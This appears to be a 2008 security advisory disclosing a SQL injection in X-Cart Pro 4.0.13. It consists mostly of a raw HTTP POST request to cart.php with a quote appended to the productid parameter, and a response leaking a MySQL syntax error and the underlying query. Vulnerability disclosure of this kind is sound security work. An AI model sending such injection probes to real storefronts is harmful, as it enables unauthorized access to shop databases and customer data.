@@ -1,0 +1,101 @@
+X-Cart Pro v4.0.13 SQL Injection Proof of Concept
+
+Discovered By:  s4squatch of SecureState R&D Team (www.securestate.com)
+
+Discovered: Mon, 08 Sep 2008 20:29:07 GMT
+
+Version:  4.0.13 obtained from www.website.com/README
+
+ 
+
+Can't find reference to this old vuln elsewhere...
+
+Ref's:
+
+http://securitytracker.com/alerts/2005/May/1014077.html
+
+http://www.securityfocus.com/bid/13817/exploit
+
+ 
+
+ 
+
+Proof of Concept:
+
+ 
+
+REQUEST:
+
+========
+
+POST /cart.php?mode=add HTTP/1.1
+
+Host: www.website.com
+
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16
+
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+
+Accept-Language: en-us,en;q=0.5
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+
+Keep-Alive: 300
+
+Proxy-Connection: keep-alive
+
+Referer: http://www.website.com/product.php?productid=16&cat=0&bestseller
+
+Cookie: store_language=US; xid=51cac653f7b0dfc3002888369aa343f9
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 206
+
+ 
+
+product_options%5B142%5D=302&product_options%5B180%5D=353&amount=1&mode=add&productid=16%27&cat=0&page=
+
+ 
+
+ 
+
+ 
+
+RESPONSE:
+
+=========
+
+HTTP/1.1 200 OK
+
+Date: Mon, 08 Sep 2008 20:29:07 GMT
+
+Server: Apache/2.0.46 (CentOS)
+
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+
+Last-Modified: Mon, 08 Sep 2008 20:29:07 GMT
+
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+
+Pragma: no-cache
+
+Set-Cookie: xid=51cac653f7b0dfc3002888369aa343f9; path=/
+
+Set-Cookie: xid=51cac653f7b0dfc3002888369aa343f9; path=/; domain=subdomain.website.com
+
+Set-Cookie: xid=51cac653f7b0dfc3002888369aa343f9; path=/; domain=subdomain.website.com
+
+Set-Cookie: RefererCookie=http%3A//www.website.com/home.php; expires=Sat, 07-Mar-2009 20:29:07 GMT; path=/; domain=subdomain.website.com
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+Content-Length: 502
+
+ 
+
+<B><FONT COLOR=DARKRED>INVALID SQL: </FONT></B>1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1<BR><B><FONT COLOR=DARKRED>SQL QUERY FAILURE:</FONT></B> SELECT * FROM xcart_products_lng WHERE code='US' AND productid=16\' <BR><BR><BR>If the page is not updated in a 5 seconds, please follow this link: <A href="cart.php">continue >></A><META http-equiv="Refresh" content="0;URL=cart.php">
